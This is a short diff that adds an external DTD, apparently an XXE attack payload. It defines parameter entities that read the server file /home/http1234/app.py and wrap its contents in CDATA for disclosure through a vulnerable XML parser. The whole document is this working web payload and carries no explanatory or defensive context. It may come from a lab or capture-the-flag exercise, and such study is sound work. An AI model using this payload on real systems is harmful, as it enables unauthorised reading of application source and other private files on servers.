@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:///home/http1234/app.py">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY contents 
+'%start;%file;%end;'>">
